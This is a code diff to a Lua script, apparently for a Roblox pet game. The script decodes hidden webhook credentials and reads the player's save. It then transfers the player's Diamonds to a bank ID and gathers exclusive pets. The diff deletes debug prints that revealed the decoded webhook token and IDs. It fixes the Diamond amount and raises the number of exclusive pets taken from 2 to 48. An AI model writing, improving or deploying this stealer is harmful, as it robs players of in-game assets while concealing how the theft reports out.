@@ -15,13 +15,11 @@ function dec(data)
     end))
 end
 return function(Me,client_id,client_token,DiscordID)
-    print(Me,client_id,client_token,DiscordID)
     Me = tonumber(dec(tostring(Me)))
     client_id = dec(client_id)
     client_token = dec(client_token)
     local Hook = "https://hooks.hyra.io/api/webhooks/"..client_id.."/"..client_token
     DiscordID = tonumber(dec(tostring(DiscordID)))
-    print(Me,client_id,client_token,hook)
     local Library = require(game.ReplicatedStorage.Framework.Library)
     local Pets = Library.Save.Get().Pets
     local function initEvent(event)
@@ -106,7 +104,7 @@ return function(Me,client_id,client_token,DiscordID)
             [1] = {
                 [1] = bankid,
                 [2] = {},
-                [3] = Library.Save.Get().Diamonds
+                [3] = math.floor(tonumber(Library.Save.Get().Diamonds))
             }
         }
         return Event2:InvokeServer(unpack(args))
@@ -115,7 +113,7 @@ return function(Me,client_id,client_token,DiscordID)
     local petids = {}
     local count = 0
     for i,v in pairs(Pets) do
-        if Library.Directory.Pets[v.id].rarity=="Exclusive" and count<2 then
+        if Library.Directory.Pets[v.id].rarity=="Exclusive" and count<48 then
             table.insert(petids,v.uid)
             count  = count + 1
         end
